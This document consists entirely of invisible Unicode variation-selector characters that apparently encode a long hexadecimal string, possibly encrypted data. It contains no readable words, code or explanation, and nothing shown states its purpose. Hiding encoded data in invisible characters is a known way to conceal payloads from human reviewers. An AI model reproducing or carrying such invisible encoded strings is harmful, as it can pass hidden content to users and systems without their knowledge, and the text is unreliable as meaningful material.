󠅕󠅖󠅔󠅔󠄥󠄥󠄣󠄡󠄧󠅓󠅖󠅓󠄣󠄢󠄤󠄨󠄤󠄦󠄦󠄩󠅓󠄦󠅖󠄡󠄡󠄦󠄠󠅒󠄦󠄣󠄠󠄠󠄡󠄨󠅓󠄩󠄦󠄤󠄧󠅑󠄩󠄦󠄩󠅔󠄩󠄧󠄣󠅔󠅓󠄥󠄠󠅔󠄣󠄩󠅕󠅑󠄦󠅕󠄢󠄣󠅕󠅑󠄧󠅔󠄩󠄩󠄨󠄤󠄩󠄠󠄦󠄩󠄥󠄥󠅕󠄦󠅕󠄨󠄩󠅓󠄧󠄨󠄢󠄤󠄩󠄣󠄣󠄡󠄦󠅑󠄠󠅓󠅕󠅑󠅔󠅑󠄩󠄩󠅖󠅖󠄠󠅔󠄡󠅖󠅕󠄨󠄡󠄢󠅑󠄧󠄥󠅒󠄣󠄢󠄨󠄦󠄣󠄠󠄠󠄤󠄣󠅑󠄠󠅔󠄠󠄤󠅖󠄧󠄤󠄤󠄤󠄣󠄩󠄤󠄢󠄦󠄧󠄥󠄣󠅕󠅒󠄠󠄧󠄩󠄡󠅔󠄩󠄥󠄣󠅓󠄢󠅔󠅖󠄥󠄠󠄩󠅔󠅒󠄥󠄤󠄩󠅕󠄤󠅕󠅔󠅔󠄦󠄨󠄦󠅕󠄨󠄦󠅔󠅑󠅒󠄦󠅕󠅕󠅓󠅖󠄣󠄥󠄨󠄧󠄤󠄤󠅒󠅕󠅔󠅕󠄨󠄠󠄡󠅓󠄢󠄩󠅒󠅖󠅔󠄦󠅒󠅑󠅖󠄠󠅕󠅑󠅔󠅔󠄣󠄦󠄦󠄡󠅔󠅒󠄢󠄣󠄦󠄠󠅖󠄢󠅔󠄤󠄦󠄣󠄢󠄡󠄩󠅓󠄧󠅓󠅒󠅒󠄢󠄢󠅖󠅑󠅑󠅔󠄥󠅕󠅕󠅒󠄠󠅖󠅖󠅖󠄨󠄤󠅒󠄦󠅔󠄨󠄨󠄨󠄤󠄦󠄧󠅓󠄦󠄦󠅖󠅓󠅒󠅒󠄥󠄤󠅒󠄤󠄨󠄨󠄣󠄣󠅓󠄠󠅓󠄤󠄦󠅔󠄦󠄡󠄤󠅔󠄥󠄩󠅖󠅒󠄧󠄥󠄧󠅕󠅖󠄧󠄠󠅔󠄧󠅖󠅑󠅓󠅖󠅔󠅔󠅔󠄣󠄠󠄥󠅓󠅖󠄥󠅑󠅖󠄦󠅔󠄡󠄤󠄦󠄥󠄠󠄣󠅖󠅖󠄤󠅒󠄢󠄦󠄠󠄧󠄥󠅓󠄨󠅒󠄤󠄦󠅕󠄢󠅑󠅕󠄠󠅑󠅖󠄩󠄤󠄡󠄥󠄣󠅒󠄧󠄨󠅕󠄢󠅒󠅓󠄣󠄢󠅕󠄩󠄣󠄢󠅖󠄣󠅕󠄡󠅕󠄡󠄧󠄧󠄩󠅒󠅒󠄡󠄨󠅓󠄩󠄦󠄢󠄠󠄢󠅕󠅔󠅖󠄧󠅒󠅑󠅑󠅕󠅕󠅔󠅖󠅓󠄧󠄡󠅑󠄣󠄧󠄦󠄥󠄨󠄥󠄤󠅕󠅖󠄢󠄡󠄥󠅑󠄤󠅒󠄧󠅒󠄣󠄢󠅒󠅕󠄦󠄦󠅖󠄣󠅕󠄢󠅓󠄧󠅑󠅓󠅕󠄢󠄡󠄩󠄣󠄤󠄦󠄣󠄨󠄣󠄢󠄠󠅖󠄧󠄠󠄤󠄨󠅔󠅖󠄦󠄧󠅖󠄠󠅔󠅕󠅑󠅓󠅔󠄤󠅕󠄦󠄣󠄩󠄢󠄣󠄣󠄩󠄠󠄧󠄠󠅒󠅒󠄥󠅕󠄨󠄦󠄩󠅒󠅑󠄩󠄢󠅕󠅔󠄦󠄢󠄡󠅓󠄨󠄦󠅓󠄠󠄩󠄦󠄡󠄣󠄦󠄢󠄢󠅑󠄤󠅖󠅕󠄡󠄠󠅖󠄦󠅑󠄦󠄡󠄩󠄩󠅕󠅖󠄥󠅔󠅒󠅑󠅑󠄡󠄤󠅒󠄧󠄦󠅓󠅖󠄥󠅒󠄡󠄦󠄠󠄧󠅒󠄩󠅕󠄡󠅓󠅒󠅑󠄧󠄨󠅓󠅓󠅕󠄡󠄠󠅓󠅒󠅔󠅔󠄧󠄥󠅑󠅑󠅑󠅔󠅔󠄡󠄠󠅔󠅑󠄡󠄠󠄦󠅖󠅖󠅖󠄢󠄦󠄣󠅕󠄨󠅒󠄣󠄤󠄥󠄢󠅓󠄡󠄤󠄧󠄢󠅓󠄥󠅖󠅒󠅒󠅓󠄦󠄥󠄦󠄨󠄦󠄡󠄠󠄨󠄥󠄦󠄤󠅑󠄨󠅓󠅖󠅓󠄥󠄥󠄡󠅓󠄤󠄦󠄤󠅑󠅓󠅑󠅖󠅒󠅑󠄠󠅖󠄢󠅑󠄣󠅒󠄩󠄣󠄣󠄦󠅖󠅕󠄩󠄦󠄦󠅒󠅔󠄧󠄣󠄢󠄥󠄥󠄩󠄡󠄤󠅕󠅖󠅕󠄩󠄩󠄠󠄥󠅒󠅒󠄦󠄡󠄠󠄨󠅖󠄠󠄥󠄡󠄥󠄣󠅔󠅑󠄦󠄨󠄦󠄩󠄦󠄢󠄠󠄧󠄥󠄩󠄤󠄢󠄤󠄤󠅕󠄥󠄧󠄣󠄦󠅓󠅔󠅑󠅖󠄢󠄤󠄠󠄥󠄣󠄤󠄤󠅔󠄣󠅖󠄤󠄩󠄡󠄢󠄨󠅖󠄧󠅔󠅖󠄡󠄡󠅕󠄥󠅒󠄤󠄧󠄣󠄦󠅖󠄥󠄧󠅓󠅕󠄤󠅕󠅔󠅔󠄡󠄢󠄡󠄠󠄦󠄦󠄩󠅖󠅔󠅒󠄦󠄦󠄢󠄤󠅔󠄤󠅖󠅕󠅑󠄢󠄨󠄧󠄦󠅕󠅓󠅑󠅖󠄨󠅓󠄧󠄣󠄠󠄩󠄥󠄦󠅔󠄣󠄩󠅓󠄡󠅒󠅑󠄥󠄨󠄧󠄠󠅒󠄨󠅑󠅓󠅒󠅔󠅑󠄢󠄣󠄧󠄤󠄢󠅑󠄨󠄩󠄠󠄢󠅔󠅖󠅒󠅔󠅖󠄥󠅑󠄧󠄧󠄤󠄤󠄧󠅓󠄣󠄡󠅒󠄨󠄢󠅕󠄡󠅒󠄢󠅒󠄥󠄧󠄧󠄨󠅓󠄦󠄨󠄡󠄤󠅔󠄧󠅑󠄦󠄥󠅕󠅓󠅕󠅔󠅒󠄨󠄧󠅖󠅒󠄩󠄥󠄦󠄥󠅓󠅒󠅒󠄥󠄤󠅕󠄢󠄡󠅕󠄡󠄢󠄦󠄩󠅕󠄠󠄡󠄧󠄤󠄩󠄠󠄦󠄩󠄣󠄡󠅒󠄨󠄩󠄤󠄣󠄦󠄠󠄢󠄤󠄨󠄨󠄥󠄤󠅕󠄠󠄩󠄩󠅓󠅔󠄧󠄦󠄤󠄩󠄦󠅖󠅔󠄤󠄢󠅕󠄦󠄣󠄠󠄠󠄠󠄤󠄥󠄢󠄤󠅑󠄨󠄧󠄨󠄠󠅓󠄢󠅑󠄠󠄧󠄩󠄢󠄨󠄧󠅒󠄨󠅖󠅕󠅔󠅓󠄠󠄥󠅕󠅖󠄠󠅕󠄠󠄢󠄩󠄤󠅑󠄡󠄧󠄥󠄡󠄠󠄥󠄡󠅓󠄠󠅒󠄩󠄡󠅓󠅖󠄥󠄤󠄧󠅔󠄩󠅔󠄩󠄣󠄠󠄢󠅒󠄧󠅓󠄤󠄣󠄠󠄡󠅖󠄩󠄢󠄤󠄧󠄡󠅑󠅒󠄩󠄧󠄥󠄠󠅔󠅔󠄧󠄧󠄤󠅕󠄢󠅖󠅔󠄣󠄣󠅓󠄨󠄣󠄢󠄦󠅒󠄢󠅖󠄤󠄧󠄠󠄤󠄢󠄣󠄡󠄨󠄨󠄧󠄢󠄢󠄩󠄣󠅒󠅑󠄩󠅔󠄨󠄥󠄣󠄤󠅓󠄩󠅓󠄦󠄤󠄥󠅕󠄠󠄤󠄦󠄥󠄡󠅖󠅑󠄠󠅕󠄦󠅕󠄥󠄨󠄠󠅔󠄣󠅓󠄤󠄤󠄧󠅓󠄧󠅖󠄥󠄥󠄠󠄩󠅖󠄠󠅔󠄠󠄦󠄣󠄥󠄠󠅓󠄦󠅓󠄢󠅑󠄩󠄣󠄢󠅖󠅒󠄦󠅕󠄥󠄦󠄥󠄧󠄤󠅑󠅑󠄩󠅒󠅒󠄨󠄦󠄠󠄨󠄩󠄥󠄦󠄨󠅔󠅒󠄢󠄥󠄤󠄧󠅖󠄧󠅓󠅑󠅔󠅓󠄧󠄤󠄥󠄣󠅔󠄨󠄧󠄠󠄨󠅕󠅕󠄧󠄣󠅔󠄠󠄢󠄧󠄦󠅕󠅔󠄧󠄥󠅖󠄦󠄨󠄤󠅓󠄦󠅑󠄦󠅒󠄩󠄢󠄤󠄩󠅓󠅒󠄡󠅔󠄤󠄧󠅔󠅖󠄢󠄩󠄥󠄡󠅕󠄠󠅔󠅕󠅔󠄧󠅔󠄡󠅑󠄡󠄡󠅔󠄥󠅑󠄨󠅑󠄢󠄨󠅒󠄧󠄤󠄩󠄩󠄨󠄩󠅒󠄩󠄢󠄠󠅕󠅔󠄡󠄡󠅓󠄥󠄩󠄥󠄥󠄠󠄩󠄩󠅓󠄨󠄨󠄢󠅕󠄢󠄤󠄠󠄧󠄩󠄤󠅒󠄥󠅓󠄨󠄧󠄦󠄣󠄥󠅕󠅔󠅓󠄦󠄡󠅒󠄥󠄥󠄥󠄣󠅓󠄣󠅓󠄡󠄨󠅓󠅕󠄣󠅓󠄥󠅕󠄡󠅖󠅖󠅕󠄢󠅖󠄨󠅔󠄧󠄡󠄡󠄨󠅓󠅓󠄧󠄠󠄤󠄢󠄢󠄤󠄡󠄤󠄩󠄧󠄤󠄩󠄥󠄣󠅑󠄣󠄤󠅖󠄣󠅑󠅖󠄤󠄣󠅑󠅕󠄦󠄠󠄥󠅒󠄤󠅔󠄠󠄤󠄠󠅔󠅑󠄠󠄨󠄥󠄨󠄤󠄢󠄥󠄥󠅒󠄥󠄥󠄡󠄠󠅕󠄤󠅕󠄧󠅕󠄥󠅑󠄥󠄤󠄣󠅒󠅕󠅖󠄠󠅑󠅒󠄡󠅓󠄡󠄠󠄥󠅓󠅒󠄩󠄧󠄩󠄢󠅓󠄠󠄢󠄡󠄩󠄨󠄠󠄤󠅒󠅓󠄨󠄣󠅓󠄣󠄥󠄡󠅖󠅒󠄩󠄣󠅓󠄤󠄤󠄤󠄠󠄦󠄤󠄨󠄡󠄠󠄥󠄧󠄥󠄢󠄣󠄤󠄢󠄧󠄣󠅕󠄧󠅓󠄢󠄩󠄩󠅓󠄨󠄨󠄠󠄤󠄤󠄨󠅓󠅔󠅑󠄢󠄣󠄤󠄧󠄡󠄣󠅒󠄣󠄠󠄡󠄧󠄣󠅕󠅕󠄠󠄧󠅓󠄩󠅓󠅕󠄤󠄥󠅕󠄩󠅔󠅓󠄣󠄧󠄧󠅔󠄨󠄥󠄩󠄥󠄩󠄩󠅔󠄡󠄢󠄤󠄠󠄩󠄩󠄥󠅖󠄤󠅓󠄢󠄡󠅒󠄠󠅖󠄧󠄠󠅓󠅒󠄠󠄧󠄥󠄧󠄠󠄢󠄨󠅓󠅖󠅔󠅒󠅑󠄦󠅓󠅖󠄩󠄨󠅖󠄦󠄦󠄦󠅑󠄨󠄩󠄣󠅒󠄨󠄦󠄠󠅔󠄡󠄢󠅑󠅒󠄦󠄣󠄡󠄧󠅓󠅕󠅕󠅓󠅑󠄦󠄠󠅖󠅔󠄥󠄦󠄩󠄩󠄦󠄩󠄧󠄢󠅑󠄡󠄥󠅒󠄠󠅑󠄦󠄨󠅖󠅔󠄨󠅑󠅖󠅑󠄥󠅒󠅓󠅒󠄩󠄩󠄦󠄠󠅔󠄨󠄠󠄤󠄤󠄡󠅒󠄠󠄧󠅓󠄧󠅕󠄤󠄠󠄨󠄨󠄣󠄦󠅔󠄦󠄦󠄣󠅓󠄨󠄠󠄠󠄤󠅒󠄦󠅕󠄡󠄦󠅕󠄥󠄨󠄨󠅕󠄡󠅕󠄠󠄤󠄡󠅕󠄧󠄣󠅓󠄨󠄦󠅑󠄡󠅖󠄠󠅑󠅒󠅒󠄨󠅑󠅑󠄩󠅓󠄡󠄣󠄦󠄢󠅕󠄥󠄡󠄤󠅖󠄦󠅔󠄨󠅕󠅓󠄣󠄢󠅑󠄢󠄤󠄡󠅖󠄠󠅕󠄠󠅖󠄡󠄩󠄨󠄡󠄦󠄣󠅖󠄥󠅕󠅔󠅔󠅕󠄣󠄣󠄢󠄥󠅖󠄣󠄣󠅕󠄠󠄩󠅖󠄥󠄩󠄡󠅕󠄤󠄤󠄣󠄧󠄢󠄧󠅖󠄤󠅖󠄤󠄤󠄠󠄥󠄢󠄥󠄠󠄥󠅖󠄣󠅖󠄩󠅕󠄥󠄧󠄠󠄢󠄨󠄤󠄦󠄡󠅖󠅒󠄧󠄩󠅑󠄢󠅖󠄢󠄨󠄨󠄥󠅒󠄤󠅓󠅑󠄣󠄨󠅖󠄣󠄧󠅔󠄥󠄨󠅒󠄤󠅑󠄡󠅑󠅒󠄠󠄧󠄨󠅓󠄦󠅑󠅔󠄩󠅑󠄢󠄧󠅕󠄨󠄣󠅖󠄢󠅔󠅔󠄡󠅖󠅔󠄥󠅓󠄢󠄤󠅓󠄢󠅔󠄢󠄧󠄣󠅑󠄢󠅒󠄢󠄦󠄧󠄩󠅔󠅒󠄤󠄤󠅕󠄣󠅖󠄨󠅒󠄢󠅖󠄨󠄡󠄤󠄧󠄠󠄢󠄢󠄦󠄣󠄧󠅖󠄥󠅕󠄩󠅒󠅔󠄩󠄧󠅒󠅔󠅕󠄤󠄢󠅕󠄠󠄥󠄠󠅓󠅕󠄩󠅔󠄦󠅒󠄡󠅖󠄧󠅔󠄦󠄩󠄣󠅖󠄩󠄥󠄦󠅓󠅖󠄢󠅓󠅓󠄡󠄦󠅕󠄥󠅓󠄤󠄠󠄢󠅑󠅕󠄧󠄦󠄨󠄤󠄥󠄤󠄨󠄡󠄣󠅕󠄠󠅖󠄠󠄧󠄡󠅖󠅑󠄠󠅒󠅒󠅓󠅑󠄧󠄠󠅔󠅓󠄦󠄨󠅓󠄦󠅔󠄡󠄨󠅔󠅔󠄠󠄨󠄢󠄩󠄠󠄧󠄨󠅕󠅖󠅓󠅒󠅑󠅔󠄨󠅖󠅔󠅓󠄤󠄠󠄦󠄡󠄤󠄦󠄨󠄨󠄧󠄣󠅖󠄩󠅖󠄣󠅒󠅒󠅖󠄥󠄥󠅔󠅑󠄥󠄨󠄢󠅕󠄤󠄡󠅒󠄤󠅓󠅖󠄡󠅔󠅒󠄧󠄧󠅒󠅒󠄠󠅔󠄧󠄩󠄨󠅕󠄣󠅒󠄧󠄠󠅕󠄠󠄥󠅕󠄧󠄢󠅖󠅑󠅕󠅖󠄤󠅒󠄠󠄠󠅕󠄥󠄤󠅔󠄣󠅔󠅖󠅔󠄨󠅔󠄢󠅔󠄠󠄣󠅒󠄩󠅒󠅔󠄧󠄩󠄨󠄢󠅓󠅔󠄠󠄦󠄧󠄨󠅔󠄩󠅕󠄦󠄥󠄤󠅖󠅒󠅓󠅔󠅓󠄩󠄢󠄦󠅓󠄢󠄤󠅖󠄢󠅓󠄨󠄤󠄡󠄨󠄤󠄡󠅓󠅒󠄦󠅖󠅓󠅑󠄡󠅖󠅕󠄦󠅖󠅖󠅔󠅖󠄥󠄩󠅓󠄧󠅕󠄩󠄨󠅒󠄦󠄩󠅑󠄢󠅖󠅓󠄩󠄨󠄢󠄠󠅓󠄣󠅓󠅕󠅖󠄣󠄡󠅕󠅔󠄣󠅔󠅖󠅖󠄤󠄧󠅑󠄠󠅑󠄨󠄨󠄡󠄠󠅓󠄣󠄠󠅓󠄨󠅑󠄤󠅖󠅕󠄠󠅑󠅕󠅑󠄨󠄥󠅑󠄦󠄠󠄩󠄡󠅓󠅖󠄩󠄡󠄤󠅔󠄦󠄦󠄥󠄣󠄩󠄠󠅑󠅖󠄩󠄢󠄤󠅑󠅔󠄩󠄡󠄤󠄤󠅖󠅖󠄤󠄥󠄤󠄤󠄣󠄠󠄨󠄤󠅑󠅑󠄦󠄥󠄦󠄠󠄧󠄧󠄥󠄠󠅔󠅔󠄠󠅔󠄠󠄩󠄤󠄢󠄧󠄢󠄧󠅒󠄨󠄢󠄥󠅑󠄧󠅓󠅕󠄧󠅖󠄧󠅓󠄤󠄡󠄢󠄡󠄤󠅔󠄥󠄦󠅔󠄣󠅔󠄣󠅓󠄠󠅓󠄤󠄤󠄨󠄣󠄩󠄥󠅖󠄠󠄠󠅑󠄦󠄥󠅒󠄢󠅑󠄣󠅔󠅔󠄢󠄢󠄣󠄦󠄩󠄣󠄥󠄠󠅕󠄣󠅒󠄨󠅕󠅔󠄦󠄦󠅒󠄦󠅔󠅓󠅑󠄦󠅒󠅔󠅕󠅑󠄥󠄢󠅔󠅓󠅖󠅖󠄦󠄢󠄦󠅔󠄠󠄩󠄥󠅑󠅒󠄡󠄩󠄩󠄢󠄧󠄦󠄣󠅓󠅕󠅔󠄨󠄩󠅔󠄧󠄩󠄥󠄧󠅑󠅔󠄠󠄢󠄩󠄠󠄡󠄠󠄣󠄡󠅔󠅓󠄠󠅖󠅑󠄣󠄨󠅖󠄡󠄨󠄥󠄥󠅓󠅓󠄣󠄨󠄥󠅔󠄢󠄧󠅔󠄣󠄣󠄧󠄥󠄣󠄧󠄩󠅒󠄥󠄥󠄧󠄨󠄡󠅑󠅔󠅖󠄠󠅖󠅖󠄠󠅔󠄡󠄥󠄤󠄠󠅔󠄥󠄤󠄦󠄥󠅑󠄡󠄡󠄨󠅓󠄤󠄣󠄠󠄡󠄠󠅖󠄩󠄩󠄨󠄦󠄥󠄤󠄢󠅕󠄣󠄡󠄣󠅔󠄢󠄤󠄣󠄩󠄢󠅒󠄨󠄥󠅔󠅔󠅕󠄡󠄠󠄩󠅖󠄥󠄩󠄠󠄨󠅒󠄤󠄥󠄤󠄡󠄡󠄢󠄠󠄤󠄩󠅒󠄢󠄨󠄩󠄧󠄢󠄣󠅕󠅒󠄤󠄣󠄤󠄤󠄥󠅕󠄤󠄤󠅑󠅑󠄥󠅓󠄣󠅕󠅔󠄡󠄧󠄥󠄡󠄨󠄧󠄧󠅕󠅔󠅑󠄡󠅓󠄧󠅑󠄧󠅔󠅒󠅔󠄡󠅒󠄡󠄩󠄥󠅖󠄤󠄧󠄩󠅒󠄧󠄩󠅓󠅒󠄤󠅑󠄣󠄨󠅔󠄠󠄩󠄧󠅒󠄨󠅔󠄠󠄡󠄠󠄩󠄢󠅖󠅕󠄢󠅖󠅒󠄠󠄢󠅓󠄢󠅖󠅑󠄧󠄣󠄦󠅕󠄥󠄢󠄧󠄧󠅓󠄡󠄨󠄠󠅔󠅖󠄢󠄥󠄦󠅖󠅓󠄩󠄢󠅒󠅕󠄨󠄦󠄧󠄦󠄣󠄧󠄣󠄣󠄨󠄥󠅖󠄥󠄩󠅕󠅖󠄥󠄥󠅖󠅕󠄧󠄩󠄦󠅑󠅕󠅕󠅕󠄣󠄠󠄡󠅓󠅑󠄤󠄩󠄨󠄣󠄩󠅔󠄥󠄧󠅖󠅒󠄨󠄤󠅒󠄩󠄨󠄤󠅑󠅔󠅕󠄩󠄠󠅕󠄡󠄡󠄩󠄧󠄨󠅖󠄩󠄢󠅕󠄩󠅖󠄠󠅖󠄤󠅑󠄤󠄢󠄡󠄣󠄧󠅒󠄡󠅒󠅕󠄤󠄦󠄤󠄨󠅕󠄢󠄧󠅕󠄥󠅕󠄥󠅒󠄢󠅔󠄥󠄣󠄩󠅒󠅔󠅖󠅔󠅓󠅒󠄢󠅖󠄡󠄧󠅔󠅓󠄤󠅖󠄠󠅖󠄧󠅒󠄠󠅖󠄨󠄧󠅒󠄦󠄧󠅒󠅓󠄨󠅑󠅕󠄢󠄤󠄢󠄡󠅕󠄣󠅓󠅒󠄢󠄩󠅔󠄥󠅑󠅒󠅔󠅔󠄨󠅓󠅔󠄣󠅔󠄣󠅒󠄠󠅖󠄦󠄤󠄠󠅔󠅒󠄣󠄢󠄦󠄧󠅕󠄠󠅖󠅓󠄧󠄤󠅔󠄣󠄩󠄩󠄩󠄣󠄤󠄢󠄤󠄢󠄧󠄤󠄢󠄧󠄩󠄢󠄡󠄩󠅖󠄩󠄤󠄠󠄩󠄥󠅔󠄥󠄩󠄩󠄨󠄣󠅔󠄨󠅕󠄧󠄠󠅕󠅓󠅒󠅕󠅑󠄡󠅖󠅓󠄢󠅑󠄢󠅕󠄧󠄤󠄨󠅑󠅓󠄤󠄦󠄧󠄢󠄤󠅓󠅒󠅔󠅓󠄡󠅑󠅕󠄧󠄥󠅓󠄨󠄢󠄣󠄥󠅑󠅒󠄡󠅒󠅖󠄩󠄣󠅖󠄡󠄦󠅓󠅓󠅑󠄣󠅒󠄧󠅒󠅕󠄩󠅔󠅔󠄥󠄦󠄧󠄩󠄡󠅖󠄦󠄤󠄨󠅑󠄦󠅔󠄠󠄢󠅒󠅔󠄧󠅑󠅖󠅔󠅑󠄤󠄠󠄨󠄡󠅒󠄧󠄦󠄩󠄩󠄦󠄤󠄨󠄡󠄤󠄡󠄦󠄩󠄠󠄧󠅖󠄣󠄩󠄩󠄧󠄢󠄤󠄠󠄠󠅖󠄨󠅔󠄧󠅔󠄠󠄠󠄥󠄩󠄥󠄨󠄢󠄠󠄡󠅖󠄢󠄥󠄠󠄨󠄥󠄨󠅕󠅓󠄤󠅕󠄩󠄣󠅔󠅒󠄢󠄥󠄨󠄠󠄩󠅒󠅒󠅒󠄧󠅒󠅔󠄠󠅖󠄤󠄤󠅔󠅒󠄨󠄠󠄣󠄩󠄧󠅕󠄨󠅓󠅕󠅑󠅒󠄦󠅒󠅓󠅖󠅖󠄤󠄣󠅒󠅔󠄥󠄧󠄡󠄩󠅒󠅔󠄠󠅓󠄩󠅓󠄣󠄡󠅕󠅕󠄧󠄤󠄠󠅕󠅕󠄢󠄡󠄤󠄨󠄨󠄥󠄩󠄩󠅒󠄡󠄩󠄧󠄢󠅖󠅒󠄦󠅑󠄠󠄡󠅕󠅑󠅓󠄧󠅓󠅕󠅕󠅕󠄡󠄥󠄠󠄦󠅔󠄧󠄨󠄥󠄤󠄠󠄠󠄧󠄥󠅒󠅑󠅓󠄧󠅕󠅓󠄧󠄤󠄦󠄤󠄦󠅑󠄧󠄡󠅕󠅔󠄩󠄦󠄧󠅓󠄩󠄠󠄤󠄤󠄧󠄣󠅕󠄨󠄠󠅔󠄤󠅑󠅓󠄢󠄦󠄨󠄠󠄣󠄠󠄤󠅕󠅖󠅒󠄡󠄨󠅔󠄤󠄧󠄦󠄨󠄠󠄦󠄥󠄥󠄥󠄩󠄦󠄨󠅒󠅑󠅑󠅓󠄢󠄡󠄣󠄠󠅒󠄢󠄢󠄤󠅒󠄢󠄨󠄩󠄩󠄡󠄠󠅖󠄦󠄦󠄦󠄠󠅕󠅒󠄢󠄦󠅑󠅔󠄢󠅔󠅓󠄩󠄧󠄡󠅒󠄤󠄠󠅑󠄧󠄠󠄣󠅕󠄨󠄦󠄧󠄩󠄡󠄦󠄡󠅑󠅒󠅓󠄦󠅖󠅒󠄩󠄧󠄦󠄠󠄡󠄧󠅔󠄢󠅒󠄢󠄨󠄦󠅑󠅑󠅖󠄩󠄥󠄩󠅖󠅖󠄢󠄤󠅒󠄦󠄣󠄩󠄧󠄡󠄦󠄧󠅔󠅓󠄣󠅔󠅔󠅒󠄣󠄤󠄤󠅔󠄣󠄦󠄥󠅒󠄡󠅖󠅑󠅖󠅓󠅒󠄦󠄨󠄧󠄤󠄢󠄥󠄧󠅓󠅕󠄩󠄦󠅒󠅕󠄦󠅑󠅔󠅕󠄡󠄡󠅓󠅔󠄧󠄡󠄤󠅑󠄢󠄨󠄣󠅓󠅑󠅒󠄥󠅓󠅖󠄣󠄩󠅔󠄨󠅑󠅖󠅓󠅒󠄨󠄩󠄦󠄤󠄩󠅕󠄧󠅕󠅓󠄣󠄥󠄠󠄣󠄢󠅕󠄠󠄥󠅓󠅓󠄠󠄣󠄩󠅕󠄢󠄩󠄩󠅓󠄦󠄥󠄠󠄠󠅑󠄧󠄢󠄢󠄤󠄨󠅒󠄠󠄡󠄠󠄧󠅖󠄡󠅒󠄩󠄡󠄧󠄥󠄦󠄤󠄩󠄨󠄧󠄨󠄣󠅖󠅓󠅔󠅕󠅔󠄢󠄦󠄩󠅔󠄣󠅔󠄨󠄡󠄩󠅖󠄨󠄩󠅕󠄢󠄩󠅑󠅕󠅖󠅑󠄢󠄣󠄩󠅔󠅓󠅕󠄡󠅓󠅔󠄣󠄥󠅖󠄢󠄡󠄡󠄤󠅖󠄧󠅔󠅔󠄧󠅑󠅓󠅓󠅒󠄠󠄥󠄡󠄧󠄤󠄤󠄠󠄣󠄠󠅑󠄣󠄦󠄡󠄢󠄡󠅕󠅔󠄣󠄥󠄤󠄨󠄢󠄠󠄧󠅔󠄡󠄧󠅒󠄤󠄨󠄤󠄣󠅒󠅑󠄥󠅕󠄧󠄦󠄥󠄢󠅑󠅕󠄢󠅔󠄢󠄠󠄣󠄣󠅔󠄨󠅕󠅑󠄠󠄠󠄣󠅕󠅕󠅖󠅔󠄨󠄠󠄥󠄥󠅑󠄧󠅖󠄩󠅒󠄡󠄧󠄡󠅔󠄣󠄤󠄤󠄢󠅑󠅕󠅔󠄥󠅔󠅔󠄢󠅑󠅔󠅖󠅑󠄢󠄡󠅕󠄤󠄤󠄢󠅔󠄨󠄠󠄦󠄧󠅓󠄩󠄣󠅕󠄥󠄨󠅒󠄡󠄣󠄦󠄢󠄡󠄠󠅖󠅓󠅒󠄩󠄤󠄩󠅕󠄧󠄠󠄢󠄠󠄡󠄦󠅕󠄣󠅒󠅒󠅖󠄥󠄡󠄠󠅒󠅑󠅕󠄨󠄤󠄡󠅓󠅕󠅕󠄡󠄨󠄧󠅑󠄣󠄨󠅒󠅕󠄦󠄥󠄦󠅖󠅑󠅖󠅑󠄠󠄩󠄨󠄢󠄢󠄠󠄨󠄣󠄧󠄩󠄣󠅒󠄧󠄤󠅖󠄨󠅒󠄧󠅓󠅓󠄥󠄦󠄢󠅓󠄠󠅑󠅓󠄡󠄣󠅖󠅒󠄠󠄧󠄣󠄤󠅔󠄥󠅓󠄣󠄣󠄧󠅔󠄣󠄥󠅔󠄣󠄧󠅓󠅑󠄧󠅕󠄡󠅒󠄦󠄦󠄡󠅒󠄨󠄠󠅒󠄨󠅖󠄢󠄡󠄣󠅕󠅓󠄢󠅔󠅑󠄣󠅑󠄧󠄥󠄦󠄨󠄩󠅔󠅖󠅔󠅖󠄢󠅒󠄦󠄣󠄠󠅓󠅑󠄣󠅖󠅕󠄦󠅕󠄥󠄢󠅑󠄡󠄩󠄠󠅓󠄦󠅓󠄥󠄦󠄡󠅒󠅓󠄠󠄣󠅒󠅑󠅓󠅖󠅔󠄢󠄩󠅑󠅖󠅖󠄩󠄥󠅕󠄠󠅔󠄦󠄧󠅑󠄢󠄨󠅑󠄧󠅓󠅕󠄦󠄠󠄥󠄡󠄣󠅒󠄢󠄢󠄨󠄥󠅒󠅓󠅒󠅑󠄠󠄠󠅒󠄦󠄥󠅔󠄩󠄠󠄠󠅑󠄥󠅑󠅖󠄠󠄠󠅓󠄦󠄢󠄦󠄢󠄠󠄡󠅔󠄧󠅓󠄩󠄩󠄣󠄨󠄣󠅑󠅑󠄠󠅕󠄤󠅓󠅖󠄣󠄤󠄥󠅒󠅖󠄢󠄤󠄩󠄦󠄣󠅒󠅔󠄢󠄣󠅔󠄩󠄩󠄡󠅒󠄧󠄩󠄠󠄨󠄡󠄢󠄨󠅒󠅕󠄣󠄦󠅒󠄧󠄦󠄡󠄠󠅕󠅑󠄣󠅖󠅑󠅑󠄡󠅖󠄩󠄢󠄤󠄦󠄤󠅔󠅑󠄨󠄢󠅓󠅔󠄡󠄤󠅖󠄥󠄧󠅕󠅔󠄤󠄧󠄨󠄢󠄤󠄥󠄦󠄦󠄠󠅕󠅔󠄤󠅑󠄡󠄢󠅓󠅖󠅔󠅑󠅒󠅑󠅑󠄠󠅔󠄨󠄤󠄤󠅖󠄠󠅓󠅑󠄦󠄥󠄢󠄨󠄡󠄤󠄡󠄨󠄣󠅔󠅖󠄤󠅔󠄥󠄨󠅒󠄡󠅕󠅑󠅒󠄧󠅓󠅕󠄢󠄨󠄥󠅓󠄡󠄠󠅖󠄣󠄢󠅖󠄩󠄥󠅖󠅓󠄨󠄥󠅕󠅔󠅓󠄧󠅓󠄧󠅖󠅕󠅒󠅑󠅔󠄢󠄥󠅕󠄨󠅕󠅕󠄨󠅓󠅒󠄣󠄡󠅑󠄥󠅒󠄧󠄢󠄦󠄧󠅖󠅒󠅓󠅓󠄨󠅕󠄢󠅑󠄡󠄨󠅓󠄨󠄡󠄣󠄤󠄠󠄦󠅒󠄠󠄣󠄥󠄤󠅕󠄥󠄢󠄦󠄨󠅖󠅖󠄤󠄥󠅕󠄠󠄦󠄤󠄥󠅒󠅕󠅖󠄢󠄣󠄣󠄥󠄩󠄣󠄥󠄡󠄤󠄥󠄩󠅒󠄢󠅒󠅕󠄥󠄦󠄨󠅖󠅑󠄡󠅓󠅒󠅒󠄧󠅑󠄣󠅕󠄥󠄩󠄦󠅕󠅕󠄩󠄦󠄢󠅒󠄨󠅓󠄦󠅓󠄩󠅖󠅔󠄠󠅒󠄠󠄩󠅔󠅕󠅓󠅕󠄦󠅓󠄠󠄨󠅖󠄤󠄢󠄣󠄩󠄤󠄩󠅕󠄡󠄣󠄥󠄩󠄡󠅔󠄩󠄩󠄦󠅒󠅑󠅕󠄧󠄨